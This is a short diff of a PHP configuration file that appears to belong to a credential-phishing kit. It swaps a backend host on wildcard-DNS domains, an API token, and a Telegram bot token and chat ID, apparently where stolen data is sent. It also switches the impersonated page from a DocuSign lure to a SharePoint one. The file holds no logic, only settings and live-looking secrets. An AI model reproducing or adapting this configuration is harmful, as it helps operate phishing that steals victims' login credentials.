@@ -1,12 +1,12 @@
 <?php
 
-$api_host = "9349b9d0ad0b39.a758a76a.sslip.io";
-$api_token = "7a12337e8761f3ba7551270fef6cdd";
-$api_prefix = "rrdmenva";
+$api_host = "5c3fed8a375460.a3f5d906.nip.io";
+$api_token = "3bac55a97b5111256c2a6ff93bb119";
+$api_prefix = "5210x0he";
 
-$telegram_bot_token = "8262420809:AAHTwbxwnRs5ZS22zUkwAqoseNqPfNDdB00";
-$telegram_chat_id = "5793923604";
+$telegram_bot_token = "7541119885:AAHgjw7yPARGULz9j4jcP2JMjDl5vFZh-50";
+$telegram_chat_id = "5528986032";
 
-$page_name = "docusign_1";
+$page_name = "sharepoint_1";
 
 ?>
